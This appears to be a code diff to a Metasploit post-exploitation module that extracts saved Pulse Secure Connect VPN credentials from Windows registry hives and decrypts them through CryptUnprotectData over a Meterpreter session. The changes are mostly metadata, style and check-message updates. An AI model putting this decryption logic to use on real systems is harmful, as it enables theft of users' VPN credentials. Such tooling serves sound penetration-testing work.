@@ -35,7 +35,27 @@ class MetasploitModule < Msf::Post
         ],
         'Platform' => ['win'],
         'SessionTypes' => ['meterpreter'],
-        'Author' => ['Quentin Kaiser <kaiserquentin[at]gmail.com>']
+        'Author' => ['Quentin Kaiser <kaiserquentin[at]gmail.com>'],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_fs_stat
+              stdapi_railgun_api
+              stdapi_sys_config_getsid
+              stdapi_sys_process_attach
+              stdapi_sys_process_get_processes
+              stdapi_sys_process_getpid
+              stdapi_sys_process_memory_allocate
+              stdapi_sys_process_memory_read
+              stdapi_sys_process_memory_write
+            ]
+          }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
   end
@@ -50,7 +70,6 @@ class MetasploitModule < Msf::Post
   #
   def decrypt_reg(data, entropy)
     begin
-      rg = session.railgun
       pid = session.sys.process.getpid
       process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
 
@@ -64,14 +83,14 @@ class MetasploitModule < Msf::Post
       #  enumerate all processes to find the one that we're are currently executing as,
       #  and then fetch the architecture attribute of that process by doing ["arch"]
       #  to check if it is an 32bits process or not.
-      if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'
+      if session.sys.process.each_process.find { |i| i['pid'] == pid }['arch'] == 'x86'
         addr = [mem].pack('V')
         len = [data.length].pack('V')
 
         eaddr = [emem].pack('V')
         elen = [entropy.length].pack('V')
 
-        ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 8)
+        ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 8)
         len, addr = ret['pDataOut'].unpack('V2')
       else
         # Convert using rex, basically doing: [mem & 0xffffffff, mem >> 32].pack("VV")
@@ -81,7 +100,7 @@ class MetasploitModule < Msf::Post
         eaddr = Rex::Text.pack_int64le(emem)
         elen = Rex::Text.pack_int64le(entropy.length)
 
-        ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 16)
+        ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 16)
         p_data = ret['pDataOut'].unpack('VVVV')
         len = p_data[0] + (p_data[1] << 32)
         addr = p_data[2] + (p_data[3] << 32)
@@ -214,7 +233,7 @@ class MetasploitModule < Msf::Post
         next unless key_names
 
         key_names.each do |key_name|
-          ive_index = key_name[4..-1] # remove 'ive:'
+          ive_index = key_name[4..] # remove 'ive:'
           # We get the encrypted password value from registry
           reg_path = "HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data\\ive:#{ive_index}"
           vals = registry_enumvals(reg_path)
@@ -351,7 +370,7 @@ class MetasploitModule < Msf::Post
     begin
       if !session.fs.file.exist?(version_path)
         print_error('Pulse Secure Connect client is not installed on this system')
-        return Msf::Exploit::CheckCode::Safe
+        return Msf::Exploit::CheckCode::Safe('Pulse Secure Connect client is not installed on this system')
       end
       version_file = begin
         session.fs.file.open(version_path)
@@ -360,7 +379,7 @@ class MetasploitModule < Msf::Post
       end
       if version_file.nil?
         print_error('Cannot open Pulse Secure Connect version file.')
-        return Msf::Exploit::CheckCode::Unknown
+        return Msf::Exploit::CheckCode::Unknown('Cannot open Pulse Secure Connect version file')
       end
       version_data = version_file.read.to_s
       version_file.close
@@ -369,18 +388,18 @@ class MetasploitModule < Msf::Post
       print_status("Target is running Pulse Secure Connect build #{build}.")
       if vuln_builds.any? { |build_range| Rex::Version.new(build).between?(*build_range) }
         print_good('This version is considered vulnerable.')
-        return Msf::Exploit::CheckCode::Vulnerable
+        return Msf::Exploit::CheckCode::Vulnerable("Pulse Secure Connect build #{build} is vulnerable")
       end
 
       if is_system?
         print_good("You're executing from a privileged process so this version is considered vulnerable.")
-        return Msf::Exploit::CheckCode::Vulnerable
+        return Msf::Exploit::CheckCode::Vulnerable('Running as SYSTEM with Pulse Secure Connect installed')
       end
 
       print_warning("You're executing from an unprivileged process so this version is considered safe.")
       print_warning('However, there might be leftovers from previous versions in the registry.')
       print_warning('We recommend running this script in elevated mode to obtain credentials saved by recent versions.')
-      return Msf::Exploit::CheckCode::Appears
+      return Msf::Exploit::CheckCode::Appears("Pulse Secure Connect build #{build} may have leftover credentials")
     rescue Rex::Post::Meterpreter::RequestError => e
       vprint_error(e.message)
     end
